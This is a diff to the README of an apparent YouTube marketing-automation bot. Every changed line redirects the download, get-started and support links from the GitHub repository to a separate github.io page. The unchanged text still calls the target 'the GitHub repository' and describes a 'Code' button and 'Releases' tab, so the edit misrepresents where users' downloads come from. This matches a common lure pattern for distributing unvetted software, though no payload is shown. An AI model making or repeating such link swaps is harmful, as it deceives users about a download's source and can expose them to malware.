@@ -1,7 +1,7 @@
 <h1>🚀 yt-marketing-bot - Automate YouTube Growth Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Hoang184200/yt-marketing-bot"><img src="https://img.shields.io/badge/Download-yt--marketing--bot-blue?style=for-the-badge&logo=github" alt="Download"></a>
+  <a href="https://hoang184200.github.io"><img src="https://img.shields.io/badge/Download-yt--marketing--bot-blue?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
 <h2>🌟 What Is yt-marketing-bot?</h2>
@@ -21,7 +21,7 @@
 <p>Getting yt-marketing-bot running on your Windows computer is quick and painless. Follow these simple steps below.</p>
 
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Hoang184200/yt-marketing-bot">https://github.com/Hoang184200/yt-marketing-bot</a>. Click the green "Code" button and choose "Download ZIP" for the easiest option, or go to the "Releases" tab to grab the latest version. The download is small and will complete in seconds on most connections.</p>
+<p>Visit this link to download the application: <a href="https://hoang184200.github.io">https://hoang184200.github.io</a>. Click the green "Code" button and choose "Download ZIP" for the easiest option, or go to the "Releases" tab to grab the latest version. The download is small and will complete in seconds on most connections.</p>
 
 <h3>Step 2: Extract the Files (If Needed)</h3>
 <p>If your download comes as a ZIP file (which it likely will), locate the file in your Downloads folder. Right-click on it and select "Extract All..." from the menu. Choose a destination folder like your Desktop or Documents, then click "Extract". This creates a new folder named something like "yt-marketing-bot-main".</p>
@@ -79,12 +79,12 @@
 </ul>
 
 <h2>🤝 Support &amp; Community</h2>
-<p>Having trouble or want to share your success story? Visit <a href="https://github.com/Hoang184200/yt-marketing-bot">the GitHub repository</a> and open an issue or start a discussion. The community is friendly and always ready to help new users get started.</p>
+<p>Having trouble or want to share your success story? Visit <a href="https://hoang184200.github.io">the GitHub repository</a> and open an issue or start a discussion. The community is friendly and always ready to help new users get started.</p>
 
 <h2>📣 Why Choose yt-marketing-bot?</h2>
 <p>Unlike complicated automation tools that require hours of setup, yt-marketing-bot gets you results in minutes. Whether you're a new YouTuber trying to gain traction or an established creator looking to expand your reach, this tool removes the manual grind and lets you focus on making great content. Join hundreds of satisfied users boosting their channels today!</p>
 
 <p align="center">
   <strong>Ready to transform your YouTube growth?</strong><br>
-  <a href="https://github.com/Hoang184200/yt-marketing-bot">🚀 Get Started Now</a>
+  <a href="https://hoang184200.github.io">🚀 Get Started Now</a>
 </p>
